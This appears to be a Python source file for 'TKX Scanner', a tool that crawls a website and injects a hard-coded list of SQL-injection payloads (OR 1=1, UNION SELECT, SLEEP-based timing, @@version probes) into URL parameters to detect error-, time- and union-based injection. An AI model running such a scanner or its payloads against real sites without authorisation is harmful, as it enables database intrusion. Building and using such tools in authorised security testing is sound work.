#!/usr/bin/env python3
"""
TKX Scanner - With False Positive Filters
"""
import requests
import time
import random
import re
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode
from typing import List, Dict, Optional, Set

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class TKXScanner:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.verify = False
        self.results = []
        self.found_signatures: Set[str] = set()
        self.current_url = ""  # Track current URL for filtering
        
    def _get_random_headers(self) -> Dict:
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'TKX-Scanner/1.0'
        ]
        
        return {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
    
    def _is_static_file(self, url: str) -> bool:
        """Check if URL is likely a static file"""
        url_lower = url.lower()
        
        # Static file extensions
        static_extensions = [
            '.js', '.css', '.jpg', '.jpeg', '.png', '.gif',
            '.ico', '.svg', '.woff', '.woff2', '.ttf', '.eot',
            '.pdf', '.zip', '.rar', '.tar', '.gz', '.mp4',
            '.mp3', '.avi', '.mov', '.webm', '.webp'
        ]
        
        for ext in static_extensions:
            if url_lower.endswith(ext):
                return True
        
        # Common static paths
        static_paths = [
            '/wp-content/', '/wp-includes/', '/assets/',
            '/images/', '/img/', '/css/', '/js/', '/fonts/',
            '/uploads/', '/static/', '/public/', '/media/'
        ]
        
        for path in static_paths:
            if path in url_lower:
                return True
        
        return False
    
    def scan_url(self, url: str, max_payloads: int = 15) -> List[Dict]:
        self.current_url = url
        
        # Skip static files
        if self._is_static_file(url):
            print(f"[*] Skipping static file: {url}")
            return []
        
        vulnerabilities = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return vulnerabilities
        
        print(f"[*] Scanning URL: {url}")
        print(f"[*] Parameters found: {', '.join(params.keys())}")
        
        for param in params.keys():
            print(f"  [-] Testing parameter: {param}")
            
            payloads = self._load_payloads()
            tested = 0
            found = 0
            
            for payload in payloads[:max_payloads]:
                try:
                    tested += 1
                    
                    test_params = params.copy()
                    test_params[param] = [payload]
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    
                    headers = self._get_random_headers()
                    start_time = time.time()
                    
                    response = self.session.get(
                        test_url,
                        params=test_params,
                        headers=headers,
                        timeout=10,
                        verify=False
                    )
                    
                    response_time = time.time() - start_time
                    
                    vuln = self._analyze_response(
                        response.text,
                        response_time,
                        payload,
                        response.status_code,
                        response.headers
                    )
                    
                    if vuln:
                        found += 1
                        vuln['url'] = url
                        vuln['parameter'] = param
                        vuln['payload'] = payload
                        vuln['status'] = response.status_code
                        vuln['response_time'] = f"{response_time:.2f}s"
                        vulnerabilities.append(vuln)
                        
                        print(f"    [!] {vuln['technique']}: {payload[:30]}...")
                        
                except Exception as e:
                    continue
            
            print(f"  [*] Parameter {param}: Tested {tested} payloads, found {found} vulnerabilities")
        
        return vulnerabilities
    
    def _analyze_response(self, response_text: str, response_time: float,
                         payload: str, status_code: int, headers: Dict = None) -> Optional[Dict]:
        
        response_lower = response_text.lower()
        
        # FILTER: Skip JavaScript/CSS files by content type
        if headers:
            content_type = headers.get('Content-Type', '').lower()
            if 'javascript' in content_type or 'css' in content_type:
                return None
        
        # FILTER: Skip empty or very short responses
        if len(response_text) < 100:
            return None
        
        # FILTER: Skip common false positive patterns
        false_positives = [
            '400 bad request',
            '404 not found',
            '403 forbidden',
            'file not found',
            'page cannot be displayed',
            'invalid parameter',
            'the requested url was not found',
            'object not found'
        ]
        
        for fp in false_positives:
            if fp in response_lower:
                return None
        
        # Check for ACTUAL SQL errors (not generic errors)
        sql_keywords = [
            ('sql syntax', 'SQL syntax error'),
            ('mysql', 'MySQL error'),
            ('postgresql', 'PostgreSQL error'),
            ('oracle', 'Oracle error'),
            ('sql server', 'SQL Server error'),
            ('syntax error', 'Syntax error'),
            ('unclosed quotation', 'Unclosed quotation'),
            ('warning: mysql', 'MySQL warning'),
            ('mysqli_', 'MySQLi error'),
            ('pg_', 'PostgreSQL error'),
            ('oci', 'Oracle error'),
            ('odbc', 'ODBC error'),
            ('driver', 'Database driver error'),
            ('database error', 'Database error'),
            ('query failed', 'Query failed'),
            ('sql statement', 'SQL statement error')
        ]
        
        for pattern, error_name in sql_keywords:
            if pattern in response_lower:
                signature = f"error:{pattern}:{payload[:20]}"
                if signature not in self.found_signatures:
                    self.found_signatures.add(signature)
                    return {
                        'technique': 'error-based',
                        'confidence': 90,
                        'evidence': error_name,
                        'signature': signature
                    }
        
        # Time-based detection (only if SLEEP in payload)
        if response_time > 5 and any(x in payload.lower() for x in ['sleep', 'waitfor', 'benchmark']):
            signature = f"time:{response_time:.1f}:{payload[:20]}"
            if signature not in self.found_signatures:
                self.found_signatures.add(signature)
                return {
                    'technique': 'time-based',
                    'confidence': 85,
                    'evidence': f"Response delayed {response_time:.2f}s",
                    'signature': signature
                }
        
        # Union-based detection (must have specific indicators)
        if 'union' in payload.lower():
            union_indicators = ['null', 'select', 'concat', 'column']
            if any(indicator in response_lower for indicator in union_indicators):
                signature = f"union:{payload[:20]}"
                if signature not in self.found_signatures:
                    self.found_signatures.add(signature)
                    return {
                        'technique': 'union-based',
                        'confidence': 80,
                        'evidence': 'Union query response detected',
                        'signature': signature
                    }
        
        return None
    
    def _load_payloads(self) -> List[str]:
        payloads = [
            "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1",
            "' UNION SELECT NULL--", "' AND 1=1--", "' AND 1=2--",
            "' AND SLEEP(5)--", "' OR SLEEP(5)--", "'; SELECT SLEEP(5)--",
            "' OR 'a'='a", "' OR 1=1--", "' OR 1=1#", "admin'--",
            "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
            "' GROUP BY columnnames having 1=1--", "-1' UNION SELECT 1,2,3--",
            "' AND 1=CONVERT(int,@@version)--"
        ]
        return payloads
    
    def crawl_for_links(self, base_url: str, max_pages: int = 20) -> List[str]:
        found_urls = []
        
        try:
            response = self.session.get(base_url, timeout=10, verify=False)
            
            url_patterns = [r'href="([^"]+)"', r'src="([^"]+)"', r'action="([^"]+)"']
            
            for pattern in url_patterns:
                for match in re.finditer(pattern, response.text):
                    url = match.group(1)
                    
                    # Skip static files
                    if self._is_static_file(url):
                        continue
                    
                    if url.startswith('http'):
                        found_urls.append(url)
                    elif url.startswith('/'):
                        parsed = urlparse(base_url)
                        full_url = f"{parsed.scheme}://{parsed.netloc}{url}"
                        if not self._is_static_file(full_url):
                            found_urls.append(full_url)
            
        except Exception as e:
            print(f"[!] Crawling error: {e}")
        
        return list(set(found_urls))[:max_pages]
    
    def full_scan(self, crawl: bool = True, max_payloads: int = 15) -> List[Dict]:
        print(f"[*] Starting TKX scan on: {self.target_url}")
        print(f"[*] Max payloads per parameter: {max_payloads}")
        
        urls_to_scan = [self.target_url]
        
        if crawl:
            print("[*] Crawling for additional URLs (skipping static files)...")
            crawled_urls = self.crawl_for_links(self.target_url)
            urls_to_scan.extend(crawled_urls)
            print(f"[*] Found {len(crawled_urls)} additional URLs (static files filtered)")
        
        all_vulnerabilities = []
        
        for url in urls_to_scan:
            vulns = self.scan_url(url, max_payloads)
            all_vulnerabilities.extend(vulns)
            
            if vulns:
                print(f"[+] URL {url}: Found {len(vulns)} vulnerabilities")
        
        return all_vulnerabilities
